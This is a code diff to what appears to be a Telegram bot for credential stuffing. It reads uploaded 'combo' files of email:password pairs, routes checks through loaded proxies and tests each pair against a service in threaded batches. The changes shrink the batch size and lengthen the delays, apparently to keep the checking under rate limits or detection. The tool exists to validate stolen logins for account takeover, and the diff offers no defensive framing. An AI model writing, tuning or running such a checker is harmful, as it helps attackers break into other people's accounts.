@@ -235,7 +235,7 @@ async def handle(message: types.Message):
         checker.proxies = proxies
         return await message.answer(f"✅ Loaded {len(proxies)} proxies!")
 
-    # Combo checking
+    # Combo checking - Small safe batches
     if message.document:
         file = await bot.get_file(message.document.file_id)
         content = (await bot.download_file(file.file_path)).read().decode('utf-8', errors='ignore')
@@ -260,13 +260,12 @@ async def handle(message: types.Message):
     total = len(lines)
     await message.answer(f"🚀 Checking {total} combos... (fast mode)")
 
-    # Process in small batches to prevent freezing
-    for i in range(0, total, 4):  # 4 at a time
-        batch = lines[i:i+4]
+    for i in range(0, total, 3):   # Only 3 at a time
+        batch = lines[i:i+3]
         for line in batch:
             try:
                 email, password = line.split(":", 1)
-                # Run the blocking check in a separate thread
+                # Run check in background thread
                 result = await asyncio.to_thread(checker.check, email.strip(), password.strip())
 
                 stats['checked'] += 1
@@ -282,7 +281,7 @@ async def handle(message: types.Message):
             except Exception:
                 continue
 
-        await asyncio.sleep(1.2)  # Small delay between batches
+        await asyncio.sleep(1.5)  # Safe delay between small batches
 
     await message.answer("✅ Finished checking all combos!")
 
@@ -296,7 +295,7 @@ async def main():
         try:
             await dp.start_polling(bot, skip_updates=True)
         except Exception as e:
-            print(f"Polling error: {e}. Restarting in 5 seconds...")
+            print(f"Polling error: {e}. Restarting in 5s...")
             await asyncio.sleep(5)
 
 
